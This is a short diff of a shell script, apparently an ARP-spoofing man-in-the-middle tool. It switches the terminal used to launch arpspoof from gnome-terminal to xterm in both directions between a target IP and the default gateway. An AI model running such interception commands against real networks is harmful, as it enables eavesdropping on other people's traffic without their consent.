@@ -63,12 +63,12 @@ function trafficSelectedIp {
 
 function interceptPackages {
   printf " Intercepting pacakages\n\n"
-  gnome-terminal -- "arpspoof -i wlan0 -t "$targetIPAddress" "$defaultGateway
+  xterm -e "arpspoof -i wlan0 -t "$targetIPAddress" "$defaultGateway
 
 }
 
 function inverseInterceptPackages {
-  gnome-terminal -- "arpspoof -i wlan0 -t "$defaultGateway" "$targetIPAddress
+  xterm -e "arpspoof -i wlan0 -t "$defaultGateway" "$targetIPAddress
 }
 
 function checkImages {
